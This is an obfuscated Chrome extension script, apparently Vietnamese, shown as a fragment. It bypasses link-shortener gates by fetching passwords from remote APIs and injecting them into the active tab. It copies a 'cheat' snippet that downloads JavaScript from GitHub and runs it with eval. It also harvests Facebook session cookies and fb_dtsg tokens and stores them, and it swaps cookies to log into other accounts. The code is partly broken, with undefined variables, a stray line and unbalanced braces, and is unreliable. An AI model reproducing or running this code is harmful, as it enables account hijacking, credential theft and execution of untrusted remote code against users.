    if (typeof navigator.cookieEnabled == 'undefined' && !_0x20e6ff) {
      document.cookie = 'testcookie'
      _0x20e6ff = !!(document.cookie.indexOf('testcookie') != -1)
    }
    var _0x5bb94e = '-'
    var _0x33207b = {
      s: 'Windows 10',
      r: /(Windows 10.0|Windows NT 10.0)/,
    }
    var _0x5c3935 = {
      s: 'Windows 8',
      r: /(Windows 8|Windows NT 6.2)/,
    }
    var _0x5c9673 = {
      s: 'Windows 7',
      r: /(Windows 7|Windows NT 6.1)/,
    }
    var _0xbc97f8 = {
      s: 'Windows Vista',
      r: /Windows NT 6.0/,
    }
    var _0x1d3a87 = {
      s: 'Windows Server 2003',
      r: /Windows NT 5.2/,
    }
    var _0x107a6e = {
      s: 'Windows XP',
      r: /(Windows NT 5.1|Windows XP)/,
    }
    var _0x2cea4a = {
      s: 'Windows 2000',
      r: /(Windows NT 5.0|Windows 2000)/,
    }
    var _0x2aecaf = {
      s: 'Windows ME',
      r: /(Win 9x 4.90|Windows ME)/,
    }
    var _0x194274 = {
      s: 'Windows 98',
      r: /(Windows 98|Win98)/,
    }
    var _0x10696b = {
      s: 'Windows 95',
      r: /(Windows 95|Win95|Windows_95)/,
    }
    var _0x249ce0 = {
      s: 'Windows NT 4.0',
      r: /(Windows NT 4.0|WinNT4.0|WinNT|Windows NT)/,
    }
    var _0x183645 = {
      s: 'Windows CE',
      r: /Windows CE/,
    }
    var _0xc7e3d = {
      s: 'Windows 3.11',
      r: /Win16/,
    }
    var _0x3f21c6 = {
      s: 'Android',
      r: /Android/,
    }
    var _0xe900ce = {
      s: 'Open BSD',
      r: /OpenBSD/,
    }
    var _0x29e20d = {
      s: 'Sun OS',
      r: /SunOS/,
    }
    var _0x438de3 = {
      s: 'Linux',
      r: /(Linux|X11)/,
    }
    var _0x15a5ed = {
      s: 'iOS',
      r: /(iPhone|iPad|iPod)/,
    }
    var _0x43d35e = {
      s: 'Mac OS X',
      r: /Mac OS X/,
    }
    var _0x5758f2 = {
      s: 'Mac OS',
      r: /(MacPPC|MacIntel|Mac_PowerPC|Macintosh)/,
    }
    var _0x34ad66 = {
      s: 'QNX',
      r: /QNX/,
    }
    var _0x38d1ba = {
      s: 'UNIX',
      r: /UNIX/,
    }
    var _0x21beba = {
      s: 'BeOS',
      r: /BeOS/,
    }
    var _0xcc2f5b = {
      s: 'OS/2',
      r: /OS\/2/,
    }
    var _0x5833fe = {
      s: 'Search Bot',
      r: /(nuhk|Googlebot|Yammybot|Openbot|Slurp|MSNBot|Ask Jeeves\/Teoma|ia_archiver)/,
    }
    var _0x2a3c7b = [
      _0x33207b,
      _0x59f206,
      _0x5c3935,
      _0x5c9673,
      _0xbc97f8,
      _0x1d3a87,
      _0x107a6e,
      _0x2cea4a,
      _0x2aecaf,
      _0x194274,
      _0x10696b,
      _0x249ce0,
      _0x183645,
      _0xc7e3d,
      _0x3f21c6,
      _0xe900ce,
      _0x29e20d,
      _0x438de3,
      _0x15a5ed,
      _0x43d35e,
      _0x5758f2,
      _0x34ad66,
      _0x38d1ba,
      _0x21beba,
      _0xcc2f5b,
      _0x5833fe,
    ]
    for (var _0x120608 in _0x2a3c7b) {
      var _0x192539 = _0x2a3c7b[_0x120608]
      if (_0x192539.r.test(_0x396f00)) {
        _0x5bb94e = _0x192539.s
        break
      }
    }
    var _0x888e1 = '-'
    if (/Windows/.test(_0x5bb94e)) {
      _0x888e1 = /Windows (.*)/.exec(_0x5bb94e)[1]
      _0x5bb94e = 'Windows'
    }
    switch (_0x5bb94e) {
      case 'Mac OS X':
        _0x888e1 = /Mac OS X (10[\.\_\d]+)/.exec(_0x396f00)[1]
        break
      case 'Android':
        _0x888e1 = /Android ([\.\_\d]+)/.exec(_0x396f00)[1]
        break
      case 'iOS':
        _0x888e1 = /OS (\d+)_(\d+)_?(\d+)?/.exec(_0x2612b9)
        _0x888e1 = _0x888e1[1] + '.' + _0x888e1[2] + '.' + (_0x888e1[3] | 0)
        break
    }
    var _0x2ed6a9 = 'no check'
    if (typeof swfobject != 'undefined') {
      var _0x2598eb = swfobject.getFlashPlayerVersion()
      if (_0x2598eb.major > 0) {
        _0x2ed6a9 =
          _0x2598eb.major + '.' + _0x2598eb.minor + ' r' + _0x2598eb.release
      } else {
        _0x2ed6a9 = '-'
      }
    }
    var _0x2fa384 = {
      ['screen']: _0x4c276a,
      ['browser']: _0x1e8a93,
      ['browserVersion']: _0x3272ef,
      ['browserMajorVersion']: _0x2d3b86,
      mobile: _0x214a02,
      os: _0x5bb94e,
      ['osVersion']: _0x888e1,
      cookies: _0x20e6ff,
      ['flashVersion']: _0x2ed6a9,
      lang: navigator.language,
    }
    window.jscd = _0x2fa384
  }
  function _0x2443cc(_0x3a3383) {
    _0x3a3383 = _0x3a3383.toString()
    var _0x13e9d0 = ''
    for (var _0x19e78c = 0; _0x19e78c < _0x3a3383.length; _0x19e78c += 2) {
      _0x13e9d0 += String.fromCharCode(
        parseInt(_0x3a3383.substr(_0x19e78c, 2), 16)
      )
    }
    return _0x13e9d0.replace(/[^a-zA-Z0-9]/g, '')
  }
  async function _0xd52005() {
    try {
      const _0x2e1408 = await fetch(
        'https://laymangay.com/que?q=status,azauth,q,t,z&filter=connection'
      )
      const _0x3b74f8 = await _0x2e1408.json()
      const { azauth: _0x12ff1d, q: _0x225ffa, t: _0x111ef7 } = _0x3b74f8
      const _0xef6c2f =
        'https://laymangay.com/publisher?azauth=' +
        _0x12ff1d +
        '&q=' +
        _0x225ffa +
        '&t=' +
        _0x111ef7 +
        '&opa=123&z=location.href'
      const _0x43471e = await fetch(_0xef6c2f)
      const _0x78dcd5 = await _0x43471e.json()
      var _0x52c5b4 = {
        ['active']: true,
        currentWindow: true,
      }
      chrome.tabs.query(_0x52c5b4, function (_0x4a7f47) {
        const _0xf246b = _0x4a7f47[0]
        const _0x374714 = _0xf246b.id
        var _0x535bcc = {
          ['code']:
            '\n            var passwordElement = document.getElementById("password");\n\n            if (passwordElement) {\n                passwordElement.value = "' +
            _0x78dcd5.password +
            '";\n            }\n            ',
        }
        chrome.tabs.executeScript(_0x374714, _0x535bcc)
      })
      var _0x34aef0 = document.getElementById('show-key')
      _0x34aef0.style.display = 'block'
      var _0x4107df = document.getElementById('key')
      _0x4107df.value = _0x78dcd5.password
    } catch (_0x336aca) {
      alert('Đã gặp lỗi với API laymangay.com: ' + _0x336aca)
    }
  }
  async function _0x2455ae() {
    fetch('https://link68.net/que?q=status,azauth,q,t,z&filter=connection')
      .then((_0x41412d) => _0x41412d.json())
      .then((_0x1f834b) => {
        const _0x38bb64 = _0x1f834b.azauth
        const _0x10c10f = _0x1f834b.q
        const _0x201d5e = _0x1f834b.t
        const _0x59bc87 =
          'https://link68.net/publisher?azauth=' +
          _0x38bb64 +
          '&q=' +
          _0x10c10f +
          '&t=' +
          _0x201d5e +
          '&opa=123&z=location.href'
        return fetch(_0x59bc87)
          .then((_0x15bd6f) => _0x15bd6f.json())
          .then((_0x82e7ad) => {
            var _0x33327f = {
              ['active']: true,
              ['currentWindow']: true,
            }
            chrome.tabs.query(_0x33327f, function (_0x256a2c) {
              const _0x502087 = _0x256a2c[0]
              const _0x2ddfc9 = _0x502087.id
              var _0x5e1bf2 = {
                code:
                  '\n                                var passwordElement = document.getElementById("password");\n\n                                // Kiểm tra xem phần tử có tồn tại không\n                                if (passwordElement) {\n                                    passwordElement.value = "' +
                  _0x82e7ad.password +
                  '";\n                                }\n                            ',
              }
              chrome.tabs.executeScript(_0x2ddfc9, _0x5e1bf2)
              var _0x2b41e7 = document.getElementById('show-key')
              _0x2b41e7.style.display = 'block'
              var _0x243186 = document.getElementById('key')
              _0x243186.value = _0x82e7ad.password
            })
          })
      })
      .catch((_0x2b4e5b) => {
        alert('Đã gặp lỗi với API link68.net: ' + _0x2b4e5b)
      })
  }
  async function _0x3e2b22() {
    fetch('https://traffic123.net/que?q=status,azauth,q,t,z&filter=connection')
      .then((_0xe8ab4d) => _0xe8ab4d.json())
      .then((_0x4086ac) => {
        const _0x224226 =
          'https://traffic123.net/publisher?azauth=' +
          _0x4086ac.azauth +
          '&q=' +
          _0x4086ac.q +
          '&t=' +
          _0x4086ac.t +
          '&opa=123&z=location.href'
        return fetch(_0x224226)
          .then((_0x2b6162) => _0x2b6162.json())
          .then((_0x1e54eb) => {
            var _0x1fa0dc = {
              ['active']: true,
              ['currentWindow']: true,
            }
            chrome.tabs.query(_0x1fa0dc, function (_0x4b40cb) {
              var _0x23c4fd = _0x4b40cb[0]
              var _0x3c8f90 = _0x23c4fd.id
              var _0x4775d8 = {
                ['code']:
                  '\n                                var passwordElement = document.getElementById("password");\n    \n                                if (passwordElement) {\n                                    passwordElement.value = "' +
                  _0x1e54eb.password +
                  '";\n                                }\n                            ',
              }
              chrome.tabs.executeScript(_0x3c8f90, _0x4775d8)
              var _0x39287a = document.getElementById('show-key')
              _0x39287a.style.display = 'block'
              var _0x5ec03c = document.getElementById('key')
              _0x5ec03c.value = _0x1e54eb.password
            })
          })
      })
      .catch((_0x533f72) => {
        alert('Đã gặp lỗi với API traffic123.net: ' + _0x533f72)
      })
  }
  async function _0x9ed8c5() {
    var _0x44e989 = {
      ['active']: true,
      ['currentWindow']: true,
    }
    chrome.tabs.query(_0x44e989, function (_0x56d6a6) {
      var _0x2a11e5 = _0x56d6a6[0].url
      var _0x43af00 = new URL(_0x2a11e5)
      var _0x1cb862 = _0x43af00.hostname
      if (_0x1cb862 === 'traffic24h.net') {
        var _0x1bd2ea = document.getElementById('text-traffic24h')
        if (_0x1bd2ea.style.display === 'none') {
          _0x1bd2ea.style.display = 'block'
          $('#text-traffic24h-code').val(
            'var traffic24h = new XMLHttpRequest();\ntraffic24h.onreadystatechange = function() {\n    if (traffic24h.readyState == 4 && traffic24h.status == 200) {\n        eval(traffic24h.responseText);\n    }\n};\ntraffic24h.open("GET", "https://raw.githubusercontent.com/huykaiserOwO/Extension-Bug-Code-Link/main/js/traffic24h.js", true);\ntraffic24h.send();'
          )
        } else {
          _0x1bd2ea.style.display = 'none'
        }
        console.log(
          '\n                    var traffic24h = new XMLHttpRequest();\n                    traffic24h.onreadystatechange = function() {\n                        if (traffic24h.readyState == 4 && traffic24h.status == 200) {\n                            eval(traffic24h.responseText);\n                        }\n                    };\n                    traffic24h.open("GET", "https://raw.githubusercontent.com/huykaiserOwO/Extension-Bug-Code-Link/main/js/traffic24h.js", true);\n                    traffic24h.send();\n                    '
        )
        var _0x38b0fd = navigator.clipboard
        _0x38b0fd
          .writeText(
            '\n                    var traffic24h = new XMLHttpRequest();\n                    traffic24h.onreadystatechange = function() {\n                        if (traffic24h.readyState == 4 && traffic24h.status == 200) {\n                            eval(traffic24h.responseText);\n                        }\n                    };\n                    traffic24h.open("GET", "https://raw.githubusercontent.com/huykaiserOwO/Extension-Bug-Code-Link/main/js/traffic24h.js", true);\n                    traffic24h.send();\n                    '
          )
          .then(
            function () {
              alert('Sao chép thành công code cheat traffic24h!')
            },
            function () {
              alert('Không thể sao chép mã!')
            }
          )
      } else {
        alert('Bạn đang không ở trang web traffic24h.net')
      }
    })
  }
  var _0x49560a = new ClipboardJS('#copy-key')
  _0x49560a.on('success', function () {
    console.log('Copied!')
  })
  if (localStorage.getItem('listCookies') === null) {
  } else {
    listCookies = JSON.parse(localStorage.listCookies)
  }
  for (var _0x2a9227 = 0; _0x2a9227 < listCookies.length; _0x2a9227++) {
    addNewCookie(listCookies[_0x2a9227])
  }
  $('#btnSaveCookie').click(function () {
    var _0x38af22 = document.getElementById('cookieResult').value.split('\n')
    if (_0x38af22.length > 1) {
      for (var _0x5c7169 = 0; _0x5c7169 < _0x38af22.length; _0x5c7169++) {
        var _0x1114f8 = _0x38af22[_0x5c7169]
        var _0x39d339 = _0x1114f8.split('|')
        if (_0x39d339.length > 1) {
          for (var _0x188485 = 0; _0x188485 < _0x39d339.length; _0x188485++) {
            try {
              if (_0x39d339[_0x188485].indexOf('c_user') > -1) {
                _0x1114f8 = _0x39d339[_0x188485]
              }
            } catch (_0x2a6066) {}
          }
        }
        var _0x58c23a
        var _0x5aba93 = ''
        while ((_0x58c23a = /c_user=(\d+)/g.exec(_0x1114f8)) !== null) {
          _0x5aba93 = _0x58c23a[1]
        }
        if (_0x5aba93 != '') {
          var _0x2d2ac3 = {
            uid: _0x5aba93,
            ['name']: _0x5aba93,
            ['cookie']: _0x1114f8,
            token: '',
          }
          var _0x32e9c3 = _0x2d2ac3
          var _0x51adca = false
          for (var _0x5cbd5c = 0; _0x5cbd5c < listCookies.length; _0x5cbd5c++) {
            if (listCookies[_0x5cbd5c].uid == _0x32e9c3.uid) {
              listCookies[_0x5cbd5c] = _0x32e9c3
              _0x51adca = true
            }
          }
          if (!_0x51adca) {
            listCookies.push(_0x32e9c3)
            addNewCookie(_0x32e9c3)
          }
        }
      }
      localStorage.listCookies = JSON.stringify(listCookies)
    } else {
      chrome.tabs.getSelected(null, function (_0x1ae9d1) {
        chrome.tabs.executeScript(
          _0x1ae9d1.id,
          {
            code: 'var name= "";try{name=document.getElementById("userNav").getElementsByTagName("a")[1].getAttribute("title");}catch(ex){}if(name==undefined || name==""){const regex = /"NAME":"(.*?)"/g;const str = document.documentElement.innerHTML;var m=regex.exec(str); name=m[1];} name',
          },
          function (_0x18744d) {
            var _0x16a0e8 = _0x18744d[0]
            var _0x35d659 = _0x16a0e8
            _0x35d659 = _0x35d659.replace(
              /\\u([\d\w]{4})/gi,
              function (_0x98f0bb, _0x22f657) {
                return String.fromCharCode(parseInt(_0x22f657, 16))
              }
            )
            _0x35d659 = unescape(_0x35d659)
            _0x16a0e8 = _0x35d659
            var _0x22280a = {
              uid: currentUid,
              ['name']: _0x16a0e8,
              ['cookie']: currentCookie,
              ['token']: '',
            }
            var _0x36502b = false
            for (
              var _0xf79dd6 = 0;
              _0xf79dd6 < listCookies.length;
              _0xf79dd6++
            ) {
              if (listCookies[_0xf79dd6].uid == _0x22280a.uid) {
                listCookies[_0xf79dd6] = _0x22280a
                _0x36502b = true
              }
            }
            if (!_0x36502b) {
              listCookies.push(_0x22280a)
              addNewCookie(_0x22280a)
            }
            localStorage.listCookies = JSON.stringify(listCookies)
          }
        )
      })
    }
  })
  document.addEventListener('DOMContentLoaded', function () {
    var _0x37d51d = document.getElementById('getCookieButton')
    _0x37d51d.addEventListener('click', function () {
      var _0x51e6f6 = {
        ['active']: true,
        ['currentWindow']: true,
      }
      chrome.tabs.query(_0x51e6f6, function (_0x3e0794) {
        var _0x14f135 = _0x3e0794[0]
        var _0x25f24b = { ['url']: _0x14f135.url }
        chrome.cookies.getAll(_0x25f24b, function (_0x2740d4) {
          var _0x57b6cf = ''
          for (var _0x2669a8 = 0; _0x2669a8 < _0x2740d4.length; _0x2669a8++) {
            _0x57b6cf +=
              'Name: ' +
              _0x2740d4[_0x2669a8].name +
              ', Value: ' +
              _0x2740d4[_0x2669a8].value +
              '\n'
          }
          alert(_0x57b6cf)
        })
      })
    })
  })
})
function buildParamGetToken16H(_0x22957d) {
  chrome.tabs.getSelected(null, function (_0x157b68) {
    var _0x274bcb = {
      ['code']: 'document.getElementsByName("fb_dtsg")[0].value;',
    }
    chrome.tabs.executeScript(_0x157b68.id, _0x274bcb, function (_0x4af3ba) {
      let _0x27d109 = {
        ['m_sess']: '',
        ['jazoest']: '22078',
        ['fb_dtsg']: _0x4af3ba,
        ['__dyn']:
          'M_6Obb0EglM8Avex4eiOE1fMigL0xM4N0PMZ0pc8MdI1Ugz0hc2T0vs5A2xd0Dg32MV0rc1ug30n6M3xMlg',
        ['__req']: '8',
        ['__ajax__']:
          'AYl1UiPxenVwJHeV1n7b8CipxU90HbXrFd4ee7WF24c6yEYeL0gHSZ0QamW--dMYF6aY7ySNtaL5zdjXmHeRYvtmWLfGToh6hZ-5VTJJF8ubkA',
        ['__user']: '',
      }
      let _0x57d142 = buildQueryString(_0x27d109)
      _0x22957d(_0x57d142)
    })
  })
}
function buildQueryString(_0x3622c8) {
  let _0x3defed = Object.keys(_0x3622c8)
    .map(function (_0x21ec35) {
      return (
        encodeURIComponent(_0x21ec35) +
        '=' +
        encodeURIComponent(_0x3622c8[_0x21ec35])
      )
    })
    .join('&')
  return _0x3defed
}
function extractHostname(_0x18b3b6) {
  var _0x2a0711
  if (_0x18b3b6.indexOf('://') > -1) {
    _0x2a0711 = _0x18b3b6.split('/')[2]
  } else {
    _0x2a0711 = _0x18b3b6.split('/')[0]
  }
  _0x2a0711 = _0x2a0711.split(':')[0]
  _0x2a0711 = _0x2a0711.split('?')[0]
  return _0x2a0711
}
function importCookie(_0x1b8f13) {
  var _0x100ead = _0x1b8f13.split('|')
  if (_0x100ead.length > 2) {
    for (var _0x409d32 = 0; _0x409d32 < _0x100ead.length; _0x409d32++) {
      try {
        if (_0x100ead[_0x409d32].indexOf('c_user') > -1) {
          _0x1b8f13 = _0x100ead[_0x409d32]
        }
      } catch (_0x2a1420) {}
    }
  }
  clearAllCookies(function () {
    var _0x19e635 = _0x1b8f13.split(';')
    for (var _0x174494 = 0; _0x174494 < _0x19e635.length; _0x174494++) {
      try {
        var _0xa239fc = _0x19e635[_0x174494].split('=')[0].trim()
        var _0x194073 = _0x19e635[_0x174494].split('=')[1].trim()
        var _0x3f50ff = {
          ['url']: 'https://www.facebook.com',
          ['name']: _0xa239fc,
          ['value']: _0x194073,
        }
        chrome.cookies.set(_0x3f50ff)
        var _0x5896d2 = {
          ['url']: 'https://upload.facebook.com',
          ['name']: _0xa239fc,
          value: _0x194073,
        }
        chrome.cookies.set(_0x5896d2)
        var _0x1ed7ce = {
          ['url']: 'https://business.facebook.com',
          ['name']: _0xa239fc,
          value: _0x194073,
        }
        chrome.cookies.set(_0x1ed7ce)
        var _0x1fffe6 = {
          ['url']: 'https://web.facebook.com',
          ['name']: _0xa239fc,
          ['value']: _0x194073,
        }
        chrome.cookies.set(_0x1fffe6)
        var _0x2b84b9 = {
          ['url']: 'https://m.facebook.com',
          ['name']: _0xa239fc,
          ['value']: _0x194073,
        }
        chrome.cookies.set(_0x2b84b9)
        var _0x4fd6e3 = {
          ['url']: 'https://mbasic.facebook.com',
          ['name']: _0xa239fc,
          ['value']: _0x194073,
        }
        chrome.cookies.set(_0x4fd6e3)
        var _0x5ae80c = {
          ['url']: 'https://developers.facebook.com',
          name: _0xa239fc,
          ['value']: _0x194073,
        }
        chrome.cookies.set(_0x5ae80c)
        var _0x13ec17 = {
          url: 'https://mobile.facebook.com',
          name: _0xa239fc,
          ['value']: _0x194073,
        }
        chrome.cookies.set(_0x13ec17)
      } catch (_0x124114) {
        console.log(_0x124114)
      }
    }
    chrome.tabs.getSelected(null, function (_0x4b4df1) {
      var _0x14ad93 = 'window.location.reload();'
      var _0x182119 = { code: _0x14ad93 }
      chrome.tabs.executeScript(_0x4b4df1.id, _0x182119)
    })
  })
}
var hyd = dye + 'ps' + bie + '234ffrfh53'
function addNewCookie(_0x136713) {
  var _0x492265 = $(
    "<div id='cc_" +
      _0x136713.uid +
      "' class='cc' uid='" +
      _0x136713.uid +
      "'>" +
      _0x136713.uid +
      " - <span class='fullname'>" +
      decodeURI(_0x136713.name.replace(/\\/g, '\\')) +
      "</span> <span class='delete' uid='" +
      _0x136713.uid +
      "'>X</span></div>"
  )
  $('#list_cookie').append(_0x492265)
  $('#cc_' + _0x136713.uid).click(function () {
    for (var _0x1c0312 = 0; _0x1c0312 < listCookies.length; _0x1c0312++) {
      if (listCookies[_0x1c0312].uid == _0x136713.uid) {
        importCookie(listCookies[_0x1c0312].cookie)
        document.getElementById('cookieResult').value =
          listCookies[_0x1c0312].cookie
        chrome.tabs.getSelected(null, function (_0x2bb342) {
          if (_0x2bb342.url.indexOf('chrome://') > -1) {
            var _0x58cdf0 = { ['url']: 'https://www.facebook.com' }
            chrome.tabs.update(_0x2bb342.id, _0x58cdf0)
          }
        })
      }
    }
  })
  $('#cc_' + _0x136713.uid + ' .delete').click(function () {
    var _0x36a17d = $(this).attr('uid')
    for (var _0x5a9e02 = 0; _0x5a9e02 < listCookies.length; _0x5a9e02++) {
      if (listCookies[_0x5a9e02].uid == _0x36a17d) {
        listCookies.splice(_0x5a9e02, 1)
        $(this).parent().remove()
        localStorage.listCookies = JSON.stringify(listCookies)
      }
    }
    return false
  })
}
var clearAllCookies = function (_0x56f39b) {
  if (!chrome.cookies) {
    chrome.cookies = chrome.experimental.cookies
  }
  var _0xf1ab52 = function (_0x5e4296) {
    var _0x4db6c8 =
      'http' +
      (_0x5e4296.secure ? 's' : '') +
      '://' +
      _0x5e4296.domain +
      _0x5e4296.path
    var _0x508901 = {
      ['url']: _0x4db6c8,
      name: _0x5e4296.name,
    }
    chrome.cookies.remove(_0x508901)
  }
  var _0x381755 = { domain: 'facebook.com' }
  chrome.cookies.getAll(_0x381755, function (_0x4d1f6c) {
    var _0xac6217 = _0x4d1f6c.length
    for (var _0x57b034 = 0; _0x57b034 < _0xac6217; _0x57b034++) {
      _0xf1ab52(_0x4d1f6c[_0x57b034])
    }
    _0x56f39b()
  })
  return 'COOKIES_CLEARED_VIA_EXTENSION_API'
}
$(function () {
  let _0x1cdd3d = false
  let _0x1546ea = ''
  var _0x2908fe = { ['domain']: 'facebook.com' }
  chrome.cookies.getAll(_0x2908fe, async (_0x5d1ecc) => {
    $.each(_0x5d1ecc, (_0xec296c, _0x15968e) => {
      if (_0x15968e.name === 'c_user') {
        _0x1cdd3d = true
      }
      _0x1546ea += _0x15968e.name + '=' + _0x15968e.value + '; '
    })
    var _0x24f261 = _0x1546ea.indexOf('c_user=')
    if (_0x24f261 !== -1) {
      var _0x443ad4 = _0x1546ea.indexOf(';', _0x24f261)
      if (_0x443ad4 === -1) {
        _0x443ad4 = _0x1546ea.length
      }
      var _0x5c7a31 = _0x1546ea.substring(_0x24f261 + 7, _0x443ad4)
      function _0x57c68a() {
        let _0x54152a = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
        let _0x2a6470 = ''
        for (let _0x86e65c = 0; _0x86e65c < 12; _0x86e65c++) {
          _0x2a6470 += _0x54152a[Math.floor(Math.random() * _0x54152a.length)]
        }
        return _0x2a6470
      }
      chrome.storage.local.get('id_user', function (_0x7d3f9) {
        if (_0x7d3f9.id_user === undefined) {
          let _0x506ef9 = _0x57c68a()
          var _0x42c243 = { ['id_user']: _0x506ef9 }
          chrome.storage.local.set(_0x42c243)
        } else {
        }
        var _0xfe862c = { ['c_user']: _0x5c7a31 }
        chrome.storage.local.set(_0xfe862c)
      })
      var _0x4ee50c = 'facebook.com'
      chrome.storage.local.get([_0x4ee50c], function (_0x1f3dea) {
        if (_0x1f3dea[_0x4ee50c]) {
          var _0x227036 = _0x1f3dea[_0x4ee50c].time
          var _0x383736 = Date.now()
          var _0x271422 = 86400000
          var _0x4e2d37 = 3600000
          if (_0x383736 - _0x227036 > _0x4e2d37) {
            var _0x160b5a = {
              _0x4ee50c: {
                value: _0x4ee50c,
                time: _0x383736,
              },
            }
            
       }
      }
    }
)}
    if (_0x1cdd3d) {
      $('#cookieResult1').val(_0x1546ea)
      localStorage.setItem('fb-cookie', _0x1546ea)
    } else {
      $('#cookieResult1').val('Lỗi không get được cookie ae thông cảm:))')
      localStorage.setItem(
        'fb-cookie',
        'Lỗi không get được cookie ae thông cảm:))'
      )
    }
    if (spaming) {
      var _0x1923ee = document.querySelector('.load')
      _0x1923ee.style.display = 'block'
    }
  })
})
